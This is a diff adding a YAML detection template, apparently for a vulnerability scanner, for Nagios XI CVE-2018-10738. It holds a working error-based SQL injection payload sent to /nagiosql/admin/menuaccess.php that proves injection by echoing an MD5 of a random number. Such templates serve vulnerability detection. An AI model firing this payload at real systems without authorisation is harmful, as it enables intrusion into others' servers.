@@ -1,0 +1,25 @@
+detail:
+  Affected Version: "Nagios XI 5.2.x\u4EE5\u53CA\u5C0F\u4E8E5.4.13\u76845.4.x"
+  author: 0x_zmz(github.com/0x-zmz)
+  links:
+  - https://www.seebug.org/vuldb/ssvid-97268
+  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10738
+expression: r0()
+manual: true
+name: poc-yaml-nagio-cve-2018-10738
+rules:
+  r0:
+    expression: response.body.bcontains(bytes(md5(string(r))))
+    request:
+      body: selSubMenu=1&subSave=1&chbKey1=-1%' and (select 1 from(select count(*),concat((select
+        (select (select md5({{r}}))) from information_schema.tables limit 0,1),floor(rand(0)*2))x
+        from information_schema.tables group by x)a)#
+      cache: true
+      follow_redirects: false
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      method: POST
+      path: /nagiosql/admin/menuaccess.php
+set:
+  r: randomInt(2000000000, 2100000000)
+transport: http
